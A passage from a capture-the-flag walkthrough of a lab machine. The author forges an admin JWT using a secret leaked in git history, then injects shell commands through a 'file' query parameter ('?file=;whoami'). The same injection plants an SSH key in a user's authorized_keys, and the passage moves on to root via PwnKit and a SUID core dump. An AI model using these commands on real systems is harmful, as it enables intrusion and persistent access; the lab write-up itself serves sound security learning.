+                <span style=color:#a6e22e>desc</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>
+            }
+        })
+    }
+})
+
+<span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>use</span>(<span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>, <span style=color:#a6e22e>next</span>) {
+    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
+        <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> {
+
+            <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;404 page not found&#34;</span>,
+            <span style=color:#a6e22e>desc</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;page you are looking for is not found. &#34;</span>
+        }
+    })
+});
+
+
+<span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>router</span>
+
+</code></pre></div><p>We can figure out that <em>getLogs</em> variable is being execute , which contains the input from <em>file</em> parameter , We can possibly exploit this to inject OS commands, But only <em>theadmin</em> user is allowed to do so. I tried to register a user as <em>theadmin</em> username but that already existed.
+So we have to somehow exploit the JWT token to login as <em>theadmin</em> user.</p><p>Reading more about the JWT Token Hacking From <a href=https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a>Here</a>, We can figure out that in order alter the JWT token we need the Secret Key.</p><p>Let&rsquo;s use the <a href=https://github.com/ticarpi/jwt_tool>jwt_tool</a> to play with the Token.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>git clone https://github.com/ticarpi/jwt_tool
+</code></pre></div><p>Running jwt_tool.py against the Token we received in response earlier.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI
+</code></pre></div><p>Found out that the JWT token used HMAC Algorithm, From the <a href=https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a>Blog</a> we found that HMAC uses the same key for signing and for verifying other than the RSA algorithm which uses Private key for signing and Public Key for Verifying the Token.</p><p>So in order to manipulate the JWT token to gain access to <em>theadmin</em> account , we have to find the secret key.</p><p>Going through the Source Code file, Found Some hidden files, <code>.env</code> and <code>.git</code>
+Checking the content of <code>.env</code> file we found some interesting stuffs.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# cat .env          
+DB_CONNECT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
+TOKEN_SECRET <span style=color:#f92672>=</span> secret
+</code></pre></div><p>We found the Secret Token, But manually verifying the altered token created by following command , did not worked out.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI -S hs256 -I -pc <span style=color:#e6db74>&#39;name&#39;</span> -pv <span style=color:#e6db74>&#39;theadmin&#39;</span> -p <span style=color:#e6db74>&#39;secret&#39;</span>
+</code></pre></div><p>Response from the server..</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.ut646rgfaqJ5umi7tCLH1l_XqwV9EPENllcjzHMBTZg&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/priv&#39;</span> -v  
+
+Note: Unnecessary use of -X or --request, GET is already inferred.
+*   Trying 10.10.11.120:3000...
+* Connected to 10.10.11.120 <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>3000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
+&gt; GET /api/priv HTTP/1.1
+&gt; Host: 10.10.11.120:3000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.ut646rgfaqJ5umi7tCLH1l_XqwV9EPENllcjzHMBTZg
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+&lt; X-Powered-By: Express
+&lt; Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+&lt; Content-Length: 13
+&lt; ETag: W/<span style=color:#e6db74>&#34;d-GLqvnw/1O/MWaNK/4OhPBcb7NQs&#34;</span>
+&lt; Date: Mon, <span style=color:#ae81ff>14</span> Mar <span style=color:#ae81ff>2022</span> 10:33:39 GMT
+&lt; Connection: keep-alive
+&lt; 
+* Connection <span style=color:#75715e>#0 to host 10.10.11.120 left intact</span>
+Invalid Token 
+
+</code></pre></div><p>Surely the secret token we found is not working, Checking out the last changes that were made in <code>.env</code> file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# git log -- .env
+
+commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+Author: dasithsv &lt;dasithsv@gmail.com&gt;
+Date:   Fri Sep <span style=color:#ae81ff>3</span> 11:30:17 <span style=color:#ae81ff>2021</span> +0530
+
+    removed .env <span style=color:#66d9ef>for</span> security reasons
+
+commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+Author: dasithsv &lt;dasithsv@gmail.com&gt;
+Date:   Fri Sep <span style=color:#ae81ff>3</span> 11:25:52 <span style=color:#ae81ff>2021</span> +0530
+
+    first commit
+
+</code></pre></div><p>Let&rsquo;s browse the older version of the file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# git show 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+
+commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+Author: dasithsv &lt;dasithsv@gmail.com&gt;
+Date:   Fri Sep <span style=color:#ae81ff>3</span> 11:25:52 <span style=color:#ae81ff>2021</span> +0530
+
+    first commit
+
+diff --git a/.env b/.env
+new file mode 100644
+index 0000000..fb6f587
+--- /dev/null
++++ b/.env
+@@ -0,0 +1,2 @@
++DB_CONNECT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
++TOKEN_SECRET <span style=color:#f92672>=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+
+</code></pre></div><p>We found the SECRET TOKEN.
+Let&rsquo;s use this token to create a new JWT to gain access to admin user.</p><p>Tampering JWT token&mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI -S hs256 -I -pc <span style=color:#e6db74>&#39;name&#39;</span> -pv <span style=color:#e6db74>&#39;theadmin&#39;</span> -p <span style=color:#e6db74>&#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39;</span>
+</code></pre></div><p>Let&rsquo;s use the generated JWT token and verify if its working or not.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/priv&#39;</span> -v
+</code></pre></div><p>Got the following reponse, So the Tampered Token is working.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/priv&#39;</span> -v
+Note: Unnecessary use of -X or --request, GET is already inferred.
+*   Trying 10.10.11.120:3000...
+* Connected to 10.10.11.120 <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>3000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
+&gt; GET /api/priv HTTP/1.1
+&gt; Host: 10.10.11.120:3000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+&lt; X-Powered-By: Express
+&lt; Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+&lt; Content-Length: 76
+&lt; ETag: W/<span style=color:#e6db74>&#34;4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0&#34;</span>
+&lt; Date: Mon, <span style=color:#ae81ff>14</span> Mar <span style=color:#ae81ff>2022</span> 11:02:10 GMT
+&lt; Connection: keep-alive
+&lt; 
+* Connection <span style=color:#75715e>#0 to host 10.10.11.120 left intact</span>
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;creds&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;role&#34;</span>:<span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;theadmin&#34;</span>,<span style=color:#e6db74>&#34;desc&#34;</span>:<span style=color:#e6db74>&#34;welcome back admin&#34;</span><span style=color:#f92672>}</span><span style=color:#f92672>}</span>
+
+</code></pre></div><p>Let&rsquo;s create request to <code>/api/logs</code> endpoint and add a <em>file</em> parameter to inject some OS command to verify if the Command Injection is working same as we figured out from source code present in <code>routes/forgot.js</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>router.get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/logs&#39;</span>, verifytoken, <span style=color:#f92672>(</span>req, res<span style=color:#f92672>)</span> <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>{</span>
+    const file <span style=color:#f92672>=</span> req.query.file;
+    const userinfo <span style=color:#f92672>=</span> <span style=color:#f92672>{</span> name: req.user <span style=color:#f92672>}</span>
+    const name <span style=color:#f92672>=</span> userinfo.name.name;
+    
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>name <span style=color:#f92672>=</span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;theadmin&#39;</span><span style=color:#f92672>)</span><span style=color:#f92672>{</span>
+        const getLogs <span style=color:#f92672>=</span> <span style=color:#e6db74>`</span>git log --oneline <span style=color:#e6db74>${</span>file<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
+        exec<span style=color:#f92672>(</span>getLogs, <span style=color:#f92672>(</span>err , output<span style=color:#f92672>)</span> <span style=color:#f92672>=</span>&gt;<span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>err<span style=color:#f92672>)</span><span style=color:#f92672>{</span>
+                res.status<span style=color:#f92672>(</span>500<span style=color:#f92672>)</span>.send<span style=color:#f92672>(</span>err<span style=color:#f92672>)</span>;
+                <span style=color:#66d9ef>return</span>
+            <span style=color:#f92672>}</span>
+            res.json<span style=color:#f92672>(</span>output<span style=color:#f92672>)</span>;
+        <span style=color:#f92672>}</span><span style=color:#f92672>)</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>else</span><span style=color:#f92672>{</span>
+        res.json<span style=color:#f92672>(</span><span style=color:#f92672>{</span>
+            role: <span style=color:#f92672>{</span>
+                role: <span style=color:#e6db74>&#34;you are normal user&#34;</span>,
+                desc: userinfo.name.name
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span><span style=color:#f92672>)</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span><span style=color:#f92672>)</span>
+</code></pre></div><p>Creating a POST request using curl..</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/logs?file=;whoami&#39;</span> -v
+
+</code></pre></div><p>Got the output in the response of the command (whoami) we injected.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/logs?file=;whoami&#39;</span> -v
+
+Note: Unnecessary use of -X or --request, GET is already inferred.
+*   Trying 10.10.11.120:3000...
+* Connected to 10.10.11.120 <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>3000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
+&gt; GET /api/logs?file<span style=color:#f92672>=</span>;whoami HTTP/1.1
+&gt; Host: 10.10.11.120:3000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+&lt; X-Powered-By: Express
+&lt; Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+&lt; Content-Length: 108
+&lt; ETag: W/<span style=color:#e6db74>&#34;6c-fpDy9UgmPp7aB73ABYx0db7yFiA&#34;</span>
+&lt; Date: Mon, <span style=color:#ae81ff>14</span> Mar <span style=color:#ae81ff>2022</span> 11:16:20 GMT
+&lt; Connection: keep-alive
+&lt; 
+* Connection <span style=color:#75715e>#0 to host 10.10.11.120 left intact</span>
+<span style=color:#e6db74>&#34;80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n&#34;</span>
+
+</code></pre></div><p>We are able to inject commands, We can now easily can a shell as <code>dasith</code> user.</p><hr><h1 id=gaining-a-foothold>Gaining a Foothold</h1><p>We are able to inject the OS command , let&rsquo;s try to get a shell to the target machine.
+We can use few methods to gain access to target machine.</p><ul><li>Using a Reverse Shell</li><li>Using SSH Port (PORT 22 is Open)</li></ul><p>I tried using various possible reverse shells but did not got connection back.
+So we can try to use SSH login using private key.</p><p>So , We have to use ssh port to gain access, But to do so we need the private ssh key.
+We have the command injection capabilities , So we can easily put that SSH Public key in authorised keys in the target machine.</p><p>Let&rsquo;s create a private and Public SSH key in attacker machine and then we can put those key in the target machine.</p><p>Creating a ssh key pair.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh-keygen -f id_rsa
+</code></pre></div><p>This Command will generate two files , Private key and Public key,
+We can add the Public key to authorized keys in the target machine and use the generated private key to get access to the target machine.</p><p>Let&rsquo;s Put the public key in Target machine authorized key.</p><p>Before putting our public key, we have to create <code>/home/dasith/.ssh/authorized_keys</code> file.</p><p>Creating .ssh directory &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/logs?file=;mkdir%20/home/dasith/.ssh&#39;</span> -v
+</code></pre></div><p>creating authorized_keys file &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/logs?file=;touch%20/home/dasith/.ssh/authorized_keys&#39;</span> -v
+</code></pre></div><p>Adding Private key to authorized keys file &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/logs?file=;echo%20&#39;</span>ssh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQC5VFeh8aEciKJw2C9nV7DKczdF1dhlFwlkeOw%2BY6N%2BjI0FrcecZQ9A7HZuQqiv06ZUHHfmpPnZzLaWK3oTcrW/jtBaHGUJCL%2B0It/DGBRLncM2iD27j2SgokSuz369TFPhQggsqg5Bp3Kom0XgV3q4r/eUR6iBsrG8dgJPNKYolnxdSYeC5kvzjHmPfhC8FFy9f6RMZGOXUfjtYP8TX7R2dtw5RPDK2j5b2F8xhtZz130VbuJn6SWg7ZCWePyfdGlYnriKT1J9XnJCsmnn6Eo1JGQEB1UjIUuZz3XwXPyRLAPat2gt7kYtxZ6YbzM1dL82JHxxMk3%2BixmRllVE/q4LpDzwxUOTcNOAcW/3vzoivYHO5LigH0ULfIMJIBLOR9OEZA974xBUkdqCLr2EzN90%2BAt9po9qNRc/0FYDn6QBXiqq8wcjIxOZl8f/ZYTXiOH07jqGVkuXPuB8AlkcRJPGXlZ1XRNu0z727fpIIYwPTWEOjq/cUwBrXhRSkOQ62uU<span style=color:#f92672>=</span>%20root@kali<span style=color:#e6db74>&#39;&gt;&gt;/home/dasith/.ssh/authorized_keys&#39;</span> -v
+</code></pre></div><p>NOTE: Make sure to url encode the public key (Spaces and &lsquo;+&rsquo; sign specifically) , Also verify the Public key manually by injecting (cat /home/dasith/.ssh/authorized_keys) command.</p><p>Also change the authorized_keys file permission to 644.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.d1Zdt09bGxGgUAtZFyH-f1VuDS9zj41s7ANhriNLxyA&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/logs?file=;chmod%20644%20/home/dasith/.ssh/authorized_keys&#39;</span> -v
+</code></pre></div><p>Lets try to connect to the target machine using SSH private key we have generated.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh dasith@10.10.11.120 -i id_rsa
+</code></pre></div><p>We got the User access to the Target Machine, Let&rsquo;s grab the user flag as well.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>cat /home/dasith/user.txt
+</code></pre></div><p>We got the User Flag.</p><p><img src=/assets/Pasted%20image%2020220314072913.png alt="assets/Pasted image 20220314072913.png"></p><p>We don&rsquo;t have the Root access to get the Root Flag, So we have to escalate privilege.</p><hr><h1 id=privilege-escalation>Privilege Escalation</h1><h3 id=method-1-->METHOD 1 -</h3><p>Let&rsquo;s run the Linpeash to find some possible Privilege escalation vectors.
+We got the following Results and found that the machine is possibly vulnerable to CVE-2021-4034 , CVE-2021-3156 and others.</p><p><img src=/assets/Pasted%20image%2020220314084404.png alt="assets/Pasted image 20220314084404.png"></p><p>Tried to used Pwnkit Exploit From <a href=https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py>Here</a> and the exploit worked and i was able to get root access.</p><p><img src=/assets/Pasted%20image%2020220314084652.png alt="assets/Pasted image 20220314084652.png"></p><p>Going through various writeups and HTB forums , i think that this was not the expected Privilege Escalation Vector.</p><p>So Let&rsquo;s try to find the methods other than the possible Privilege Escalation CVEs that provided by linpeas scan.</p><h3 id=method-2-->METHOD 2 -</h3><p>Let&rsquo;s try to find some files which can be run with root rights.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>find / -type f -perm -u<span style=color:#f92672>=</span>s 2&gt;/dev/null
+</code></pre></div><p>Found out a interesting file <code>/opt/count</code> , After running it i understand how the program was working, it takes a file as input and return the number of lines, words and characters. It also supports to save the results.</p><p>There is also another file <code>code.c</code> , It is potentially the source code of the binary <code>count</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+{
+    <span style=color:#66d9ef>char</span> path[<span style=color:#ae81ff>100</span>];
+    <span style=color:#66d9ef>int</span> res;
+    <span style=color:#66d9ef>struct</span> stat path_s;
+    <span style=color:#66d9ef>char</span> summary[<span style=color:#ae81ff>4096</span>];
+
+    printf(<span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Enter source file/directory name: </span><span style=color:#e6db74>&#34;</span>);
+    scanf(<span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%99s</span><span style=color:#e6db74>&#34;</span>, path);
+    getchar();
+    stat(path, <span style=color:#f92672>&amp;</span>path_s);
+    <span style=color:#66d9ef>if</span>(S_ISDIR(path_s.st_mode))
+        dircount(path, summary);
+    <span style=color:#66d9ef>else</span>
+        filecount(path, summary);
+    <span style=color:#75715e>// drop privs to limit file write
+</span><span style=color:#75715e></span>    setuid(getuid());
+    <span style=color:#75715e>// Enable coredump generation
+</span><span style=color:#75715e></span>    prctl(PR_SET_DUMPABLE, <span style=color:#ae81ff>1</span>);
+    printf(<span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Save results a file? [y/N]: </span><span style=color:#e6db74>&#34;</span>);
+    res <span style=color:#f92672>=</span> getchar();
+    <span style=color:#66d9ef>if</span> (res <span style=color:#f92672>=</span><span style=color:#f92672>=</span> <span style=color:#ae81ff>121</span> <span style=color:#f92672>|</span><span style=color:#f92672>|</span> res <span style=color:#f92672>=</span><span style=color:#f92672>=</span> <span style=color:#ae81ff>89</span>) {
+        printf(<span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Path: </span><span style=color:#e6db74>&#34;</span>);
+        scanf(<span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%99s</span><span style=color:#e6db74>&#34;</span>, path);
+        FILE <span style=color:#f92672>*</span>fp <span style=color:#f92672>=</span> fopen(path, <span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>a</span><span style=color:#e6db74>&#34;</span>);
+        <span style=color:#66d9ef>if</span> (fp <span style=color:#f92672>!</span><span style=color:#f92672>=</span> NULL) {
+            fputs(summary, fp);
+            fclose(fp);
+        } <span style=color:#66d9ef>else</span> {
+            printf(<span style=color:#e6db74></span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Could not open %s for writing</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, path);
+        }
+    }
+
+</code></pre></div><p>There is a interesting line..</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>prctl<span style=color:#f92672>(</span>PR_SET_DUMPABLE, 1<span style=color:#f92672>)</span>;
+</code></pre></div><p>After some research, this command activates the generation of log following a core dump. This log contains among other things the contents of the memory during the crash, it would be possible to recover the contents of the file being read by the program.</p><p>So let&rsquo;s try to make a core dump during the execution of program and analyze the logs.
